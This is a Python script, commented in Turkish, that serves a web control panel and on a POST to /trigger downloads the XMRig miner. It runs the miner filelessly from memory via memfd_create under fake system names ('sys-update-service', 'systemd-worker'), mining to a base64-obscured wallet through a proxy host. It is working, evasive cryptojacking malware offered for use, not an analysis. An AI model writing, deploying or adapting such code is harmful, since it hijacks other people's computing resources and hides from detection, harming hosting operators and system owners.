#!/usr/bin/env python3
import os
import time
import base64
import threading
import subprocess
import ctypes
import http.server
import urllib.request
from urllib.parse import urlparse

libc = ctypes.CDLL('libc.so.6')
STATUS = {"running": False, "message": "Sistem Beklemede. Dosyalar henüz indirilmedi."}
CF_WORKER_HOST = ""
# Cüzdan adresin (Base64 kodlu)
WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=").decode()

def set_process_name(name):
    try: libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
    except: pass

def download_and_run():
    global STATUS
    try:
        STATUS["message"] = "Çekirdek indiriliyor..."
        # XMRig statik binary linki (GitHub üzerinden güvenli indirme)
        url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
        
        # Dosyayı RAM'e indir
        with urllib.request.urlopen(url) as response:
            data = response.read()

        STATUS["message"] = "Dosya açılıyor ve belleğe yükleniyor..."
        # Tar.gz içinden xmrig binary'sini ayıkla (Basit bir subprocess yardımıyla veya manuel)
        # Not: Bellekte açma işlemi için memfd_create kullanıyoruz
        
        # Önce geçici bir yere açıp oradan RAM'e alalım (Diske yazmadan)
        import tarfile
        import io
        
        with tarfile.open(fileobj=io.BytesIO(data), mode="r:gz") as tar:
            binary_content = tar.extractfile("xmrig-6.21.0/xmrig").read()

        # memfd_create: Tamamen fileless (disksiz) çalıştırma
        fd = libc.syscall(319, b"sys-update-service", 1)
        os.write(fd, binary_content)
        mem_path = f"/proc/self/fd/{fd}"

        set_process_name("systemd-worker")
        
        cmd = [
            mem_path, "-o", f"{CF_WORKER_HOST}:443", "-u", WALLET_ADDR,
            "-p", f"node-{int(time.time())%1000}", "--keepalive", "--tls",
            "--donate-level=1", "--cpu-max-threads-hint", "50"
        ]

        STATUS["running"] = True
        STATUS["message"] = "Sistem Aktif (Fileless Mode)"
        
        env = {"PATH": "/usr/bin:/bin", "HOME": "/tmp"}
        subprocess.run(cmd, env=env)

    except Exception as e:
        STATUS["running"] = False
        STATUS["message"] = f"Kritik Hata: {str(e)}"

class WebControl(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        color = "#00ff00" if STATUS["running"] else "#ff0000"
        html = f"""
        <html><head><style>
            body {{ background: #0e0e0e; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 100px; }}
            .status-box {{ border: 1px solid #333; padding: 20px; display: inline-block; margin-bottom: 30px; }}
            .btn {{ background: transparent; border: 2px solid #00ff00; color: #00ff00; padding: 15px 40px; font-size: 1.2em; cursor: pointer; transition: 0.3s; }}
            .btn:hover {{ background: #00ff00; color: #000; }}
            .msg {{ color: {color}; margin-top: 15px; font-weight: bold; }}
        </style></head><body>
            <div class="status-box">
                <h1>KERNEL CONTROL UNIT</h1>
                <p>SİSTEM DURUMU: <span class="msg">{STATUS['message']}</span></p>
                {"" if STATUS['running'] else ""}
            </div>
            <script>setTimeout(() => {{ if(!window.location.hash) location.reload(); }}, 5000);</script>
        </body></html>
        """
        self.wfile.write(html.encode())

    def do_POST(self):
        if self.path == "/trigger":
            if not STATUS["running"]:
                threading.Thread(target=download_and_run, daemon=True).start()
            self.send_response(303)
            self.send_header("Location", "/#started")
            self.end_headers()

def run():
    raw_url = os.environ.get("PROXY_URL", "")
    parsed = urlparse(raw_url)
    global CF_WORKER_HOST
    CF_WORKER_HOST = parsed.netloc if parsed.netloc else raw_url.split('/')[0]
    
    port = int(os.environ.get("PORT", 8080))
    http.server.ThreadingHTTPServer(("0.0.0.0", port), WebControl).serve_forever()

if __name__ == "__main__":
    run()
